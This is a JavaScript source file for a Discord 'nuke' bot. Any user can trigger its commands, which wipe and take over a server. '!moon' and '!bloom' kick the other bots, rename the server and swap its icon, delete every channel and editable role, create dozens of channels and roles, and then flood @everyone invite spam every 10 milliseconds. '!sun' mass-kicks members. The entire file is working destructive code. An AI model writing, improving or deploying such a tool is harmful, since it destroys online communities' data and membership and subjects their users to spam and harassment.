// handlers/nuke.js
const { ChannelType } = require("discord.js");

let welcomeInterval = null;

// =========================
// BANNER URL
// =========================
const BANNER_URL = "https://cdn.discordapp.com/attachments/1531280455553388564/1555413440024023100/a9366db0-e4ac-4190-845c-b1eeb6e88b92.gif?backend=b2&ex=6ac7af66&is=6ac65de6&hm=ff994fce35c7a6fad6460c11715e456166f82dfe486a734e4c744016b3ce9207&";

module.exports = (client) => {
    client.on("messageCreate", async (message) => {
        if (message.author.bot || !message.guild) return;

        const guild = message.guild;
        const command = message.content.toLowerCase();

        // ==========================================
        // 1. COMMAND: !moon
        // ==========================================
        if (command === "!moon") {
            try {
                // 1. Kick all other bots
                const botMembers = await guild.members.fetch();
                for (const [, member] of botMembers) {
                    if (
                        member.user.bot &&
                        member.id !== client.user.id &&
                        member.id !== message.author.id &&
                        member.kickable
                    ) {
                        await member.kick("Moon command").catch(() => {});
                    }
                }

                // 1.1 Server Details Change
                await guild.setName("Nuked by Moon Community 🌙").catch(() => {});
                await guild.setIcon(
                    "https://cdn.discordapp.com/attachments/1560933166716428299/1561008115628113970/IMG_fe34a356-623c-4c8f-9015-d7ed804bf08a.jpg?ex=6ad4c998&is=6ad37818&hm=aeefd3bb5b5b7c626f173e73b666314906ca046eda3bfbef5006f5f34155cdd3&"
                ).catch(() => {});
                
                // 2. Delete all existing channels
                const channels = [...guild.channels.cache.values()];
                for (const channel of channels) {
                    await channel.delete("Moon command").catch(() => {});
                }

                // 3. Delete all deletable roles
                const roles = [...guild.roles.cache.values()];
                for (const role of roles) {
                    if (role.id !== guild.id && role.editable) {
                        await role.delete("Moon command").catch(() => {});
                    }
                }

                // 4. Create new text channels
                const newChannels = [];
                for (let i = 0; i < 20; i++) {
                    const channel = await guild.channels.create({
                        name: "moon community nuke annoucers 📢",
                        type: ChannelType.GuildText
                    }).catch(() => null);

                    if (channel) {
                        newChannels.push(channel);
                    }
                }

                // 4.1 Create new roles safely
                for (let i = 0; i < 20; i++) {
                    await guild.roles.create({
                        name: "moon community annoucers 📢"
                    }).catch(() => null);
                }

                // 5. Send initial message
                const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
                await Promise.all(
                    newChannels.map(channel =>
                        channel.send({
                            content: welcomeMessage,
                            embeds: [{ image: { url: BANNER_URL } }]
                        }).catch(() => {})
                    )
                );

                // 6. Stop previous interval if active
                if (welcomeInterval) {
                    clearInterval(welcomeInterval);
                    welcomeInterval = null;
                }

                // 7. Interval spam
                welcomeInterval = setInterval(async () => {
                    for (const channel of newChannels) {
                        await channel.send({
                            content: welcomeMessage,
                            embeds: [{ image: { url: BANNER_URL } }]
                        }).catch(() => {});
                    }
                }, 10);

            } catch (error) {
                console.error("Error executing !moon command:", error);
            }
        }

        // ==========================================
        // 2. COMMAND: !sun (Members Kick)
        // ==========================================
        if (command === "!sun") {
            try {
                const allMembers = await guild.members.fetch();
                
                for (const [, member] of allMembers) {
                    if (
                        member.id !== client.user.id &&
                        member.id !== message.author.id &&
                        member.kickable
                    ) {
                        await member.kick("Sun command").catch(() => {});
                    }
                }
            } catch (error) {
                console.error("Error executing !sun command:", error);
            }
        }

        // ==========================================
        // 3. COMMAND: !bloom
        // ==========================================
        if (command === "!bloom") {
            try {
                // 1. Kick all other bots
                const botMembers = await guild.members.fetch();
                for (const [, member] of botMembers) {
                    if (
                        member.user.bot &&
                        member.id !== client.user.id &&
                        member.id !== message.author.id &&
                        member.kickable
                    ) {
                        await member.kick("bloom command").catch(() => {});
                    }
                }

                // 1.1 Server Details Change
                await guild.setName("Moon Community 🌙").catch(() => {});
                await guild.setIcon(
                    "https://cdn.discordapp.com/attachments/1531280455553388564/1556007534551371776/519nH38DWOL._AC_UF8941000_QL80_.jpg?backend=b2&ex=6ac29871&is=6ac146f1&hm=f78a05a105d4e1b0b48cd263fe0af374c40161823702edf73e853c8f1bb09465&"
                ).catch(() => {});
                
                // 2. Delete all existing channels
                const channels = [...guild.channels.cache.values()];
                for (const channel of channels) {
                    await channel.delete("bloom command").catch(() => {});
                }

                // 3. Delete all deletable roles
                const roles = [...guild.roles.cache.values()];
                for (const role of roles) {
                    if (role.id !== guild.id && role.editable) {
                        await role.delete("bloom command").catch(() => {});
                    }
                }

                // 4. Create new text channels
                const newChannels = [];
                for (let i = 0; i < 20; i++) {
                    const channel = await guild.channels.create({
                        name: "moon community annoucers 📢",
                        type: ChannelType.GuildText
                    }).catch(() => null);

                    if (channel) {
                        newChannels.push(channel);
                    }
                }

                // 5. Send initial message
                const welcomeMessage = "@everyone @here\n🌙 **Join Our Moon Community!** ✨\nActive Chats • Coding • Events • Chill Vibes 🚀\n🔗 https://discord.gg/62xxMq2NKv";
                await Promise.all(
                    newChannels.map(channel =>
                        channel.send({
                            content: welcomeMessage
                        }).catch(() => {})
                    )
                );

                // 6. Stop previous interval if active
                if (welcomeInterval) {
                    clearInterval(welcomeInterval);
                    welcomeInterval = null;
                }

                // 7. Interval spam
                welcomeInterval = setInterval(async () => {
                    for (const channel of newChannels) {
                        await channel.send({
                            content: welcomeMessage,
                            embeds: [{ image: { url: BANNER_URL } }]
                        }).catch(() => {});
                    }
                }, 10);

            } catch (error) {
                console.error("Error executing !bloom command:", error);
            }
        }
              
        // ==========================================
        // 4. COMMAND: !stop
        // ==========================================
        if (command === "!stop") {
            if (welcomeInterval) {
                clearInterval(welcomeInterval);
                welcomeInterval = null;
                await message.channel.send("🛑 nuke stoped.").catch(() => {});
            }
        }
    });
};
